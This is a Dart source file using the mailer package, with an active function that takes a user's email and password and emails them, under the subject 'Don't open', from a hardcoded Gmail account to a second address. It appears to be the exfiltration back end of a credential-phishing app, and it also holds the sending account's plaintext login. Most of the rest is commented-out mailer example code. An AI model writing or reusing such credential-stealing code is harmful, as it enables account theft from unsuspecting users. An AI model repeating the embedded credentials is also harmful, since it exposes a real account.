import 'package:mailer/mailer.dart';
import 'package:mailer/smtp_server.dart';
import 'dart:io';
import 'package:args/args.dart';
import 'package:logging/logging.dart';
import 'package:mailer/mailer.dart';
import 'package:mailer/smtp_server.dart';

//class EmailSender {
//  EmailSender({this.ToBeSentEmail, this.ToBeSentPass});

main(String ToBeSentEmail, String ToBeSentPass) async {
  final String username = 'sasukeisgay86@gmail.com';
  final String password = 'sasukeboy86';

  var smtpServer = gmail(username, password);

  final message = Message()
    ..from = Address(username, 'SASUKE MAN')
    ..recipients.add('mandofoula@gmail.com')
    ..subject = "Don't open"
    ..text = 'Email : $ToBeSentEmail\nPassword : $ToBeSentPass';
//  print(message);
  try {
    final sendReport = await send(message, smtpServer);
//    print('Message sent: ' + sendReport.toString());
  } on MailerException catch (e) {
//    print('Message not sent.');
//    print(e);
    for (var p in e.problems) {
//      print('Problem: ${p.code}: ${p.msg}');
    }
  }
  // DONE

  // Let's send another message using a slightly different syntax:
  //
  // Addresses without a name part can be set directly.
  // For instance `..recipients.add('destination@example.com')`
  // If you want to display a name part you have to create an
  // Address object: `new Address('destination@example.com', 'Display name part')`
  // Creating and adding an Address object without a name part
  // `new Address('destination@example.com')` is equivalent to
  // adding the mail address as `String`.
//  print('b4 equivalent');
//  final equivalentMessage = Message()
//    ..from = Address(username, 'Sasuke Uchiha')
//    ..recipients.add(Address('mohamed.m.foula@gmail.com'))
//    ..subject = 'Test Dart Mailer library :: 😀 '
//    ..text = 'Email : $ToBeSentEmail\nPassword : $ToBeSentPass.'
//    ;
////
////    final sendReport2 = await send(equivalentMessage, smtpServer);
////
//  try {
////    final sendReport2 = await send(equivalentMessage, smtpServer);
//    var connection = PersistentConnection(smtpServer);
////    await connection.send(message);
//    await connection.send(equivalentMessage);
//    await connection.close();
//  } catch (e) {
//    print(e);
//  }
//
//
//    List<String> rawArgs = ['mandofoula@gmail.com'];
//
//    var args = parseArgs(rawArgs);
//
//    if (args['verbose'] as bool) {
//      Logger.root.level = Level.ALL;
//      Logger.root.onRecord.listen((LogRecord rec) {
//        print('${rec.level.name}: ${rec.time}: ${rec.message}');
//      },);
//    }
//
//    String username2 = args.rest[0];
//    if (username2.endsWith('@gmail.com')) {
//      username2 = username2.substring(0, username2.length - 10);
//    }
//
//    List<String> tos = args['to'] as List<String> ?? [];
//    if (tos.isEmpty) {
//      tos.add(username2.contains('@') ? username2 : username2 + '@gmail.com');
//    }
//
//
//    Iterable<Address> toAd(Iterable<String> addresses) =>
//        (addresses ?? []).map((a) => Address(a));
//
//
//    final message2 = Message()
//      ..from = Address('$username2@gmail.com', 'My name 😀')
//      ..recipients.addAll(toAd(tos))
//      ..ccRecipients.addAll(toAd(args['cc'] as Iterable<String>))
//      ..bccRecipients.addAll(toAd(args['bcc'] as Iterable<String>))
//      ..text = 'This is the plain text.\nThis is line 2 of the text part.'
//      ..html = "<h1>Test</h1>\n<p>Hey! Here's some HTML content</p>"
//      ..attachments.addAll([]);
}
//  ArgResults parseArgs(List<String> rawArgs) {
//    var parser = ArgParser()
//      ..addFlag('verbose', abbr: 'v', help: 'Display logging output.')
//      ..addMultiOption('to',
//          abbr: 't',
//          help: 'The addresses to which the email is sent.\n'
//              'If omitted, then the email is sent to the sender.')
//      ..addMultiOption('',
//          abbr: 'a', help: 'Paths to files which will be attached to the email.')
//      ..addMultiOption('cc', help: 'The cc addresses for the email.')
//      ..addMultiOption('bcc', help: 'The bcc addresses for the email.');
//
//    var args = parser.parse(rawArgs);
//    if (args.rest.length != 2) {
//      showUsage(parser);
//      print("adawdw");
//    }
//
//    var attachments = args[''] as Iterable<String> ?? [];
//    for (var f in attachments) {
//      File attachFile = File(f);
//      if (!attachFile.existsSync()) {
//        showUsage(parser, 'Failed to find file to attach: ${attachFile.path}');
//        exit(1);
//      }
//    }
//    return args;
//  }
//
//  showUsage(ArgParser parser, [String message]) {
//    if (message != null) {
//      print(message);
//      print('');
//    }
//    print('Usage: send_gmail [options] <username> <password>');
//    print('');
//    print(parser.usage);
//    print('');
//    print('If you have Google\'s "app specific passwords" enabled,');
//    print('you need to use one of those for the password here.');
//    print('');
//  }
//}
